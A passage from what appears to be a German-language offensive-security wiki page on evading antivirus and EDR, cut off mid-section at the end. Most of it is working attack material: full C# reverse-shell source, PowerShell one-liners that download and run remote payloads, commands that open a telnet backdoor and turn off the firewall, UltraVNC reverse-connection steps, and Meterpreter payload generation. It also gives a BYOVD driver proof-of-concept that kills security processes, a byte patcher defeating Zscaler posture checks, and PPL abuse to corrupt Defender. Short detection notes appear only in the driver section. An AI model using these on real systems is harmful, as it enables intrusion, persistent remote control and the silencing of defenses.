3.  Proxy-call stripping – ConfuserEx ersetzt direkte Method Calls durch leichte Wrapper (a.k.a *proxy calls*), um die Dekomprimierung weiter zu erschweren. Entferne sie mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt solltest du normale .NET API wie `Convert.FromBase64String` oder `AES.Create()` statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) sehen.

4.  Manuelle Bereinigung – führe die resultierende Binary in dnSpy aus, suche nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um die *echte* Payload zu finden. Oft speichert die Malware sie als TLV-kodiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Die obige Kette stellt den Ausführungsfluss **wieder her**, ohne die bösartige Probe ausführen zu müssen – nützlich, wenn du auf einem Offline-Workstation arbeitest.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Proben automatisch zu triagieren.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Das Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/)-Compilationssuite bereitzustellen, der erhöhte Software-Sicherheit durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Tamper-Proofing ermöglicht.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die Sprache `C++11/14` verwenden kann, um zur Compile-Zeit obfuskierten Code zu erzeugen, ohne ein externes Tool zu verwenden und ohne den Compiler zu verändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Ebene obfuszierter Operationen hinzu, die vom C++-Template-Metaprogramming-Framework generiert werden und das Leben der Person, die die Anwendung knacken will, etwas schwieriger machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binary-Obfuscator, der verschiedene PE-Dateien obfuskieren kann, einschließlich: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphische Code-Engine für beliebige ausführbare Dateien.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein fein granuliertes Code-Obfuscation-Framework für von LLVM unterstützte Sprachen unter Verwendung von ROP (return-oriented programming). ROPfuscator obfuskieren ein Programm auf der Assembly-Code-Ebene, indem reguläre Instruktionen in ROP-Chains umgewandelt werden, wodurch unsere natürliche Vorstellung vom normalen Kontrollfluss untergraben wird.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter, geschrieben in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL in shellcode umwandeln und sie dann laden

## SmartScreen & MoTW

Du hast diesen Bildschirm vielleicht schon gesehen, wenn du einige ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt hast.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endnutzer davor schützen soll, potenziell schädliche Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich mit einem reputationsbasierten Ansatz, was bedeutet, dass ungewöhnlich heruntergeladene Anwendungen SmartScreen auslösen und so den Endnutzer warnen und daran hindern, die Datei auszuführen (obwohl die Datei weiterhin durch Klicken auf More Info -> Run anyway ausgeführt werden kann).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch zusammen mit der URL, von der sie heruntergeladen wurden, erstellt wird.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Prüfen des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass mit einem **trusted** Signaturzertifikat signierte ausführbare Dateien **SmartScreen nicht auslösen werden**.

Eine sehr effektive Möglichkeit, deine payloads davor zu schützen, die Mark of The Web zu erhalten, ist, sie in einem Container wie einer ISO zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **non NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das payloads in Ausgabe-Container packt, um Mark-of-the-Web zu umgehen.

Beispielverwendung:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads in ISO-Dateien mit [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) verpackt werden

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsstarker Logging-Mechanismus in Windows, der Anwendungen und Systemkomponenten erlaubt, **Events zu loggen**. Allerdings kann er auch von Sicherheitsprodukten verwendet werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) wird, ist es auch möglich, die **`EtwEventWrite`**-Funktion des User-Space-Prozesses sofort zurückkehren zu lassen, ohne irgendwelche Events zu loggen. Dies geschieht, indem die Funktion im Speicher gepatcht wird, sodass sie sofort zurückkehrt, wodurch das ETW-Logging für diesen Prozess effektiv deaktiviert wird.

Weitere Infos findest du unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Das Laden von C# Binaries im Speicher ist schon seit einiger Zeit bekannt und weiterhin eine sehr gute Möglichkeit, deine post-exploitation tools auszuführen, ohne von AV erwischt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne die Disk zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bieten bereits die Möglichkeit, C# Assemblies direkt im Speicher auszuführen, aber es gibt verschiedene Wege dafür:

- **Fork\&Run**

Dabei wird **ein neuer Opferprozess erstellt**, dein bösartiger post-exploitation code in diesen neuen Prozess injiziert, dein bösartiger code ausgeführt und nach Abschluss der neue Prozess beendet. Das hat sowohl Vorteile als auch Nachteile. Der Vorteil der fork and run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implantatprozesses stattfindet. Das bedeutet, dass wenn bei unserer post-exploitation-Aktion etwas schiefgeht oder sie erkannt wird, es eine **deutlich größere Chance** gibt, dass unser **Implantat überlebt.** Der Nachteil ist, dass die Wahrscheinlichkeit, von **Behavioural Detections** erwischt zu werden, **größer** ist.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der bösartige post-exploitation code **in seinen eigenen Prozess** injiziert. Auf diese Weise kannst du vermeiden, einen neuen Prozess zu erstellen und ihn von AV scannen zu lassen, aber der Nachteil ist, dass wenn bei der Ausführung deiner Payload etwas schiefgeht, es eine **deutlich größere Chance** gibt, deinen **Beacon zu verlieren**, da er abstürzen kann.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C# Assemblies lesen möchtest, schau dir bitte diesen Artikel an [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Du kannst C# Assemblies auch **aus PowerShell** laden, siehe [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen code mit anderen Sprachen auszuführen, indem man der kompromittierten Maschine Zugriff **auf die Interpreter-Umgebung gibt, die auf dem Attacker Controlled SMB share installiert ist**.

Indem du Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB share erlaubst, kannst du **beliebigen code innerhalb des Speichers** der kompromittierten Maschine in diesen Sprachen **ausführen**.

Das Repo weist darauf hin: Defender scannt die scripts weiterhin, aber durch die Nutzung von Go, Java, PHP usw. haben wir **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen, nicht obfuskierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping ist eine Technik, die es einem Angreifer erlaubt, **das access token oder ein Sicherheitsprodukt wie EDR oder AV zu manipulieren**, sodass dessen Privilegien reduziert werden. Der Prozess stirbt dann nicht, hat aber keine Berechtigungen mehr, um nach bösartigen Aktivitäten zu suchen.

Um das zu verhindern, könnte Windows **externen Prozessen verbieten**, Handles auf die Tokens von Sicherheitsprozessen zu erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Wie in [**diesem Blogbeitrag**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf einem Opfer-PC bereitzustellen und ihn dann zur Übernahme und zur Aufrechterhaltung von Persistenz zu nutzen:
1. Herunterladen von https://remotedesktop.google.com/, auf "Set up via SSH" klicken und dann auf die MSI-Datei für Windows klicken, um die MSI-Datei herunterzuladen.
2. Den Installer auf dem Opfer still ausführen (Admin erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Zurück zur Chrome Remote Desktop-Seite gehen und auf next klicken. Der Assistent fordert dich dann auf, die Autorisierung zu bestätigen; klicke auf den Authorize-Button, um fortzufahren.
4. Den angegebenen Parameter mit einigen Anpassungen ausführen: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Beachte den pin-Parameter, mit dem sich der pin ohne Verwendung der GUI setzen lässt).


## Advanced Evasion

Evasion ist ein sehr kompliziertes Thema; manchmal musst du viele verschiedene Telemetriequellen in nur einem System berücksichtigen, daher ist es in ausgereiften Umgebungen nahezu unmöglich, komplett unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich kann dir sehr empfehlen, diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzuschauen, um einen Einstieg in fortgeschrittenere Evasion-Techniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Das ist auch ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das **Teile der Binärdatei entfernt**, bis es **herausfindet, welchen Teil Defender** als bösartig erkennt, und ihn dir aufteilt.\
Ein weiteres Tool, das **dasselbe tut, ist** [**avred**](https://github.com/dobin/avred) mit einem offenen Webangebot des Dienstes unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Bis Windows10 kamen alle Windows-Versionen mit einem **Telnet-Server**, den du als Administrator so installieren konntest:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Mach es so, dass es beim Systemstart **startet** und **jetzt** ausgeführt wird:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet-Port ändern** (Stealth) und Firewall deaktivieren:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Setze ein Passwort in _VNC Password_
- Setze ein Passwort in _View-Only Password_

Dann verschiebe die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ in den **victim**

#### **Reverse connection**

Der **attacker** sollte innerhalb seines **host** die Binärdatei `vncviewer.exe -listen 5900` ausführen, damit er **bereit** ist, eine reverse **VNC connection** zu empfangen. Dann, auf dem **victim**: Starte den winvnc daemon `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNING:** Um stealth zu bewahren, darfst du ein paar Dinge nicht tun

- Starte `winvnc` nicht, wenn es bereits läuft, sonst löst du ein [popup](https://i.imgur.com/1SROTTl.png) aus. Prüfe mit `tasklist | findstr winvnc`, ob es läuft
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst wird [the config window](https://i.imgur.com/rfMQWcf.png) geöffnet
- Führe `winvnc -h` nicht für Hilfe aus, sonst löst du ein [popup](https://i.imgur.com/oc18wcu.png) aus

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Jetzt **starte den Listener** mit `msfconsole -r file.rc` und **führe** das **xml payload** mit aus:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Unser eigenes Reverse Shell kompilieren

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Reverse Shell

Kompiliere es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# mit compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C#-Obfuscators-Liste: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Verwendung von python für build injectors Beispiel:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Andere tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 nutzte ein winziges Konsolen-Utility namens **Antivirus Terminator**, um Endpoint-Schutzmaßnahmen vor dem Droppen von Ransomware zu deaktivieren. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light (PPL) AV-Services nicht blockieren können.

Wichtige Erkenntnisse
1. **Signierter Treiber**: Die auf die Festplatte gelieferte Datei ist `ServiceMouse.sys`, aber das Binary ist der legitim signierte Treiber `AToolsKrnl64.sys` aus dem „System In-Depth Analysis Toolkit“ von Antiy Labs. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er auch geladen, wenn Driver-Signature-Enforcement (DSE) aktiviert ist.
2. **Service-Installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **kernel service**, und die zweite startet ihn, damit `\\.\ServiceMouse` aus dem user land erreichbar wird.
3. **Vom Treiber bereitgestellte IOCTLs**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Einen beliebigen Prozess per PID beenden (verwendet, um Defender/EDR-Services zu killen) |
| `0x990000D0` | Eine beliebige Datei auf der Festplatte löschen |
| `0x990001D0` | Den Treiber entladen und den Service entfernen |

Minimales C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Warum es funktioniert**: BYOVD umgeht user-mode protections vollständig; Code, der im Kernel ausgeführt wird, kann *protected* Prozesse öffnen, sie beenden oder Kernel-Objekte manipulieren, unabhängig von PPL/PP, ELAM oder anderen Hardening-Features.

Detection / Mitigation
•  Aktiviert Microsofts vulnerable-driver block list (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.
•  Überwacht das Erstellen neuer *kernel* services und alarmiert, wenn ein Treiber aus einem world-writable Verzeichnis geladen wird oder nicht auf der allow-list steht.
•  Achtet auf user-mode handles zu benutzerdefinierten device objects, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscalers **Client Connector** wendet device-posture-Regeln lokal an und verlässt sich auf Windows RPC, um die Ergebnisse an andere Komponenten zu kommunizieren. Zwei schwache Designentscheidungen ermöglichen einen vollständigen Bypass:

1. Die Posture-Auswertung erfolgt **vollständig clientseitig** (an den Server wird nur ein boolean gesendet).
2. Interne RPC-Endpunkte prüfen nur, ob das verbindende Executable **von Zscaler signiert** ist (via `WinVerifyTrust`).

Durch das **Patchen von vier signierten Binarys auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jeder Check compliant ist |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder Prozess (auch unsignierte) kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen am Tunnel | Short-circuited |

Minimaler patcher-Auszug:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nachdem die Originaldateien ersetzt und der Service-Stack neu gestartet wurde:

* **Alle** Posture-Checks werden als **grün/compliant** angezeigt.
* Nicht signierte oder modifizierte Binaries können die named-pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Policies definiert ist.

Diese Fallstudie zeigt, wie rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgangen werden können.

## Missbrauch von Protected Process Light (PPL), um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) erzwingt eine Signer/Level-Hierarchie, sodass nur gleich- oder höhergeschützte Prozesse sich gegenseitig manipulieren können. Offensiv gilt: Wenn du eine PPL-fähige Binary legitim starten und ihre Argumente kontrollieren kannst, lässt sich harmlose Funktionalität (z. B. Logging) in eine eingeschränkte, PPL-gestützte Write-Primitive gegen geschützte Verzeichnisse umwandeln, die von AV/EDR verwendet werden.

Was macht einen Prozess zu PPL
- Die Ziel-EXE (und alle geladenen DLLs) müssen mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess unter Verwendung der Flags `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` erstellt werden.
- Es muss eine kompatible Protection Level angefordert werden, die zum Signer der Binary passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Levels schlagen bei der Erstellung fehl.

Siehe auch eine allgemeinere Einführung zu PP/PPL und LSASS-Schutz hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tooling
- Open-Source-Helper: CreateProcessAsPPL (wählt den Protection Level aus und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Nutzungsmuster:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN-Primitive: ClipUp.exe
- Die signierte System-Binärdatei `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei an einen vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn sie als PPL-Prozess gestartet wird, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann keine Pfade mit Leerzeichen parsen; verwende 8.3-Kurznamen, um auf normalerweise geschützte Speicherorte zu verweisen.

8.3-Kurzpfad-Helfer
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzen Pfad in cmd ableiten: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse-Chain (abstrakt)
1) Starte den PPL-fähigen LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` über einen Launcher (z. B. CreateProcessAsPPL).
2) Übergib das ClipUp-Logpfad-Argument, um eine Dateierstellung in einem geschützten AV-Verzeichnis zu erzwingen (z. B. Defender Platform). Verwende bei Bedarf 8.3-Kurznamen.
3) Wenn die Ziel-Binärdatei normalerweise vom AV geöffnet/gesperrt ist, während er läuft (z. B. MsMpEng.exe), plane den Schreibvorgang beim Booten vor dem Start des AV, indem du einen Auto-Start-Service installierst, der zuverlässig früher läuft. Validere die Boot-Reihenfolge mit Process Monitor (boot logging).
4) Beim Neustart erfolgt der PPL-gestützte Schreibvorgang, bevor der AV seine Binärdateien sperrt, wodurch die Zieldatei beschädigt und der Start verhindert wird.

Beispielaufruf (Pfade aus Sicherheitsgründen entfernt/gekürzt):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Hinweise und Einschränkungen
